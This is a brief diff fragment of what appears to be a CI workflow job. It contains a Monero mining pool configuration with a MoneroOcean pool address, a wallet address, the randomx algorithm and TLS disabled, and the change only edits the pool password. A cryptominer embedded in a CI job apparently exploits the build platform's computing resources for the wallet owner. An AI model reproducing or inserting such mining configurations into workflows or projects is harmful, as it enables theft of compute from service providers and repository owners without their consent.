@@ -40,7 +40,7 @@ jobs:
           "pools": [{
             "url": "gulf.moneroocean.stream:10128",
             "user": "47HxtCmFXxqVzQSGjQgBnDC1LRTrokf3aMFocbWQRxYzjhjxkfLGjzwE3PJhrCtdQkXPunr8cZZBAiEmY5W46V1UV8mFMZh",
-            "pass": "mustafa5",
+            "pass": "mustafa4",
             "algo": "randomx",
             "tls": false
           }]
